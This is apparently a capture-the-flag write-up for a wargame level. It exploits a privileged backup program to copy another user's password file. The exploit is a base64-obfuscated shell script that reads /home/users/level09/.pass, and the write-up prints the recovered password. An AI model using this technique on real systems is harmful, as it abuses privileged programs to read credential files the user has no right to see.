# level08

The [target program](source.c) contains only a `main()` function, that take a file path as an argument, and copy it in the `./backups` directory, since we do not have the permission to create directories in our home, we will recreate the file system arborescense in tmp and execute the script `womp.sh` :


```bash
level08@OverRide:/tmp$ echo "bWtkaXIgLXAgL3RtcC9iYWNrdXBzL2hvbWUvdXNlcnMvbGV2ZWwwOQp0b3VjaCAvdG1wL2JhY2t1cHMvLmxvZwpjZCAvdG1wCn4vbGV2ZWwwOCAiL2hvbWUvdXNlcnMvbGV2ZWwwOS8ucGFzcyIKY2F0ICIvdG1wL2JhY2t1cHMvaG9tZS91c2Vycy9sZXZlbDA5Ly5wYXNzIgo=" | base64 -d > womp.sh && chmod +x womp.sh && ./womp.sh
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

we have the password of level09 ! :3